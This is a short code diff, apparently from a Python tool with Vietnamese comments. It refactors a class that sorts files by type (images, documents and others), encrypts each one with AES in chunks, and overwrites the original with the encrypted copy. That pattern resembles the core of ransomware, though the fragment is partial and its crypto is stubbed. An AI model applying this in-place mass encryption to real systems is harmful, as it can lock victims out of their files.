@@ -4,13 +4,19 @@ import shutil
 import pathlib
 import zipfile
 import concurrent.futures
-from models import aes
+
+
+
+class AES:
+    def generate_key(length=32) -> bytes:...
+    def encrypt(key, plaintext, workload=100000) -> bytes:...
 
 
 
 class CommonFiles:
-    def __init__(self) -> None:
-        self.key = aes.generate_key(32)  # Tạo khóa AES
+    def __init__(self, aes: AES, key: bytes) -> None:
+        self.aes = aes
+        self.key = key
         self.file_categories: typing.Dict[str, typing.List[str]] = {
             'images': ['.jpg', '.png', '.gif', '.bmp', '.svg', '.tif', '.tiff', '.jpeg'],
             'documents': ['.txt', '.docx', '.md', '.rst', '.doc', '.pdf', '.xlsx', '.xls', '.pptx', '.odt', '.odp', '.rtf', '.epub'],
@@ -27,7 +33,7 @@ class CommonFiles:
                     chunk = original_file.read(1024 * 1024 * 10)  # Đọc tệp theo từng khối
                     if not chunk:
                         break
-                    processed_chunk = aes.encrypt(self.key, chunk, 1024 * 1024 * 10)
+                    processed_chunk = self.aes.encrypt(self.key, chunk, 1024 * 1024 * 10)
                     temp_file_handle.write(processed_chunk)
             shutil.move(temp_file, file)  # Thay thế tệp gốc bằng tệp đã mã hóa
         except Exception as e:
